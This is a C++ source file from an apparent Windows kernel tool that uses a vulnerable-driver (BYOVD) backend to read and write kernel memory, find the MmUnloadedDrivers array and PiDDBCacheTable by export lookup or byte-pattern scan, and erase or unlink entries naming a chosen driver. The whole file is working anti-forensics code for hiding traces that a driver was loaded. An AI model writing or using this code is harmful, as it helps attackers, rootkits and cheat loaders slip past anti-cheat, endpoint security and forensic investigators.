#include "hinv_cleaner.hpp"
#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <cstddef>

#ifndef _WINDOWS_
typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;
#endif

namespace hinv {
namespace cleaner {

struct UNLOADED_DRIVER_ENTRY {
    UNICODE_STRING Name;
    PVOID StartAddress;
    PVOID EndAddress;
    LARGE_INTEGER CurrentTime;
};

struct PIDDB_CACHE_ENTRY {
    LIST_ENTRY List;
    UNICODE_STRING DriverName;
    ULONG TimeDateStamp;
    NTSTATUS LoadStatus;
};

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

// ---------------------------------------------------------------------------
// Pattern scanning helper. '?' is wildcard.
// ---------------------------------------------------------------------------

static bool PatternMatch(const uint8_t* data, const std::vector<uint8_t>& pattern, const std::vector<bool>& mask) {
    for (size_t i = 0; i < pattern.size(); ++i) {
        if (mask[i] && data[i] != pattern[i]) return false;
    }
    return true;
}

static uint64_t FindPattern(byovd::IByovdBackend* backend, uint64_t begin, uint32_t size,
                            const std::vector<uint8_t>& pattern, const std::vector<bool>& mask,
                            int32_t ripOffset = 0) {
    if (pattern.size() != mask.size() || pattern.empty()) return 0;

    constexpr size_t CHUNK = 0x1000;
    std::vector<uint8_t> buffer(CHUNK + pattern.size());

    for (uint32_t off = 0; off < size; off += CHUNK) {
        uint32_t readSize = (off + CHUNK > size) ? (size - off) : CHUNK;
        readSize = static_cast<uint32_t>(readSize + pattern.size());
        if (off + readSize > size) readSize = size - off;

        if (!backend->ReadKernelMemory(begin + off, buffer.data(), readSize)) continue;

        for (size_t i = 0; i + pattern.size() <= readSize; ++i) {
            if (PatternMatch(buffer.data() + i, pattern, mask)) {
                uint64_t matchVa = begin + off + i;
                if (ripOffset != 0) {
                    int32_t rel = *reinterpret_cast<int32_t*>(buffer.data() + i + ripOffset);
                    return matchVa + ripOffset + 4 + rel;
                }
                return matchVa;
            }
        }
    }
    return 0;
}

static uint64_t FindNtoskrnlSection(byovd::IByovdBackend* backend, const char* sectionName, uint32_t& outSize) {
    auto mods = kmem::EnumKernelModules();
    uint64_t ntosBase = 0;
    for (const auto& m : mods) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
            ntosBase = m.base;
            break;
        }
    }
    if (!ntosBase) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return 0;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = ntosBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;

    for (const auto& sec : sections) {
        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), sectionName, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            outSize = sec.Misc.VirtualSize;
            return ntosBase + sec.VirtualAddress;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Locate kernel globals
// ---------------------------------------------------------------------------

static uint64_t FindMmUnloadedDrivers(byovd::IByovdBackend* backend) {
    // Try exported symbol first.
    uint64_t addr = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "MmUnloadedDrivers");
    if (addr) return addr;

    // Fallback pattern scan.
    uint32_t textSize = 0;
    uint64_t textBase = FindNtoskrnlSection(backend, ".text", textSize);
    if (!textBase) return 0;

    // lea rcx, MmUnloadedDrivers ; add rcx, 18h
    // 48 8D 0D ? ? ? ? 48 83 C1 18
    std::vector<uint8_t> pat = { 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC1, 0x18 };
    std::vector<bool> mask = { true, true, true, false, false, false, false, true, true, true, true };
    return FindPattern(backend, textBase, textSize, pat, mask, 3);
}

static uint64_t FindPiDDBCacheTable(byovd::IByovdBackend* backend) {
    uint64_t addr = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "PiDDBCacheTable");
    if (addr) return addr;

    uint32_t textSize = 0;
    uint64_t textBase = FindNtoskrnlSection(backend, ".text", textSize);
    if (!textBase) return 0;

    // lea rcx, PiDDBCacheTable ; call
    // 48 8D 0D ? ? ? ? E8 ? ? ? ? 8B F0
    std::vector<uint8_t> pat = { 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x8B, 0xF0 };
    std::vector<bool> mask = { true, true, true, false, false, false, false, true, false, false, false, false, true, true };
    return FindPattern(backend, textBase, textSize, pat, mask, 3);
}

static uint64_t FindPiDDBLock(byovd::IByovdBackend* backend) {
    return kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "PiDDBLock");
}

// ---------------------------------------------------------------------------
// Unicode comparison helper
// ---------------------------------------------------------------------------

static bool NamesMatch(byovd::IByovdBackend* backend, uint64_t unicodeStringVa, const std::wstring& target) {
    UNICODE_STRING us{};
    if (!backend->ReadKernelMemory(unicodeStringVa, &us, sizeof(us))) return false;
    if (!us.Buffer || us.Length == 0) return false;

    std::wstring name(us.Length / sizeof(wchar_t), L' ');
    if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(us.Buffer), name.data(), us.Length)) return false;
    return ToLower(name) == ToLower(target);
}

// ---------------------------------------------------------------------------
// MmUnloadedDrivers cleaner
// ---------------------------------------------------------------------------

bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    uint64_t globalVa = FindMmUnloadedDrivers(backend);
    if (!globalVa) {
        std::wcerr << L"[hinv::cleaner] MmUnloadedDrivers not located\n";
        return false;
    }

    constexpr size_t ARRAY_SIZE = 50;
    bool found = false;

    // Determine whether the global is an array of pointers or a pointer to an array.
    uint64_t firstEntry = 0;
    uint64_t arrayVa = globalVa;
    if (backend->ReadKernelMemory(globalVa, &firstEntry, sizeof(firstEntry)) &&
        firstEntry >= 0xFFFF000000000000ULL) {
        // Try dereferencing as pointer-to-array.
        uint64_t probe = 0;
        if (backend->ReadKernelMemory(firstEntry, &probe, sizeof(probe)) &&
            probe >= 0xFFFF000000000000ULL) {
            arrayVa = firstEntry;
        }
    }

    // Array of pointers layout (most common).
    std::vector<uint64_t> pointers(ARRAY_SIZE, 0);
    if (backend->ReadKernelMemory(arrayVa, pointers.data(), pointers.size() * sizeof(uint64_t))) {
        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
            if (!pointers[i]) continue;
            if (pointers[i] < 0xFFFF000000000000ULL) continue;

            if (NamesMatch(backend, pointers[i], driverName)) {
                UNLOADED_DRIVER_ENTRY zeroed{};
                if (backend->WriteKernelMemory(pointers[i], &zeroed, sizeof(zeroed))) {
                    uint64_t nullPtr = 0;
                    backend->WriteKernelMemory(arrayVa + i * sizeof(uint64_t), &nullPtr, sizeof(nullPtr));
                    found = true;
                    std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers entry #" << i << L" for " << driverName << L"\n";
                }
            }
        }
    }

    // Record-array fallback (less common).
    if (!found) {
        UNLOADED_DRIVER_ENTRY entries[ARRAY_SIZE]{};
        if (backend->ReadKernelMemory(arrayVa, entries, sizeof(entries))) {
            for (size_t i = 0; i < ARRAY_SIZE; ++i) {
                if (NamesMatch(backend, arrayVa + i * sizeof(UNLOADED_DRIVER_ENTRY) + offsetof(UNLOADED_DRIVER_ENTRY, Name), driverName)) {
                    UNLOADED_DRIVER_ENTRY zeroed{};
                    if (backend->WriteKernelMemory(arrayVa + i * sizeof(UNLOADED_DRIVER_ENTRY), &zeroed, sizeof(zeroed))) {
                        found = true;
                        std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers record #" << i << L" for " << driverName << L"\n";
                    }
                }
            }
        }
    }

    return found;
}

// ---------------------------------------------------------------------------
// PiDDBCacheTable cleaner
// ---------------------------------------------------------------------------

bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    uint64_t tableVa = FindPiDDBCacheTable(backend);
    if (!tableVa) {
        std::wcerr << L"[hinv::cleaner] PiDDBCacheTable not located\n";
        return false;
    }

    uint64_t lockVa = FindPiDDBLock(backend);
    if (!lockVa) {
        std::wcerr << L"[hinv::cleaner] PiDDBLock not located; cannot safely modify cache\n";
        return false;
    }

    if (!kmem::AcquireKernelLock(backend, lockVa, 0)) {
        std::wcerr << L"[hinv::cleaner] Failed to acquire PiDDBLock\n";
        return false;
    }

    // PiDDBCacheTable uses LIST_ENTRY on Windows 7-10 21H2 and RTL_RB_TREE on newer.
    // This walker only supports the LIST_ENTRY layout. For RB_TREE builds a
    // dedicated in-order traversal is required; that is not yet implemented.
    bool found = false;

    LIST_ENTRY tableList{};
    if (backend->ReadKernelMemory(tableVa, &tableList, sizeof(tableList))) {
        uint64_t headFlink = reinterpret_cast<uint64_t>(tableList.Flink);
        uint64_t current = headFlink;
        int guard = 0;

        while (current && current != tableVa && guard++ < 1024) {
            uint64_t entryVa = current - offsetof(PIDDB_CACHE_ENTRY, List);
            PIDDB_CACHE_ENTRY entry{};
            if (!backend->ReadKernelMemory(entryVa, &entry, sizeof(entry))) break;

            if (NamesMatch(backend, entryVa + offsetof(PIDDB_CACHE_ENTRY, DriverName), driverName)) {
                uint64_t flink = reinterpret_cast<uint64_t>(entry.List.Flink);
                uint64_t blink = reinterpret_cast<uint64_t>(entry.List.Blink);

                backend->WriteKernelMemory(flink + offsetof(LIST_ENTRY, Blink), &blink, sizeof(blink));
                backend->WriteKernelMemory(blink + offsetof(LIST_ENTRY, Flink), &flink, sizeof(flink));

                PIDDB_CACHE_ENTRY zeroed{};
                backend->WriteKernelMemory(entryVa, &zeroed, sizeof(zeroed));

                found = true;
                std::wcout << L"[hinv::cleaner] Removed PiDDBCacheTable entry for " << driverName << L"\n";
            }
            current = reinterpret_cast<uint64_t>(entry.List.Flink);
        }
    }

    kmem::ReleaseKernelLock(backend, lockVa, 0);
    return found;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

CleanResult CleanDriverTraces(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    CleanResult result{};
    if (!backend) {
        result.error = L"invalid backend";
        return result;
    }

    std::wcout << L"[hinv::cleaner] Sanitizing traces for " << driverName << L"\n";
    result.mmUnloadedDrivers = ClearUnloadedDriverEntry(backend, driverName);
    result.piDdbCache = ClearPiDddbCache(backend, driverName);

    if (!result.mmUnloadedDrivers && !result.piDdbCache) {
        result.error = L"no matching traces found or globals not located";
    }
    return result;
}

} // namespace cleaner
} // namespace hinv
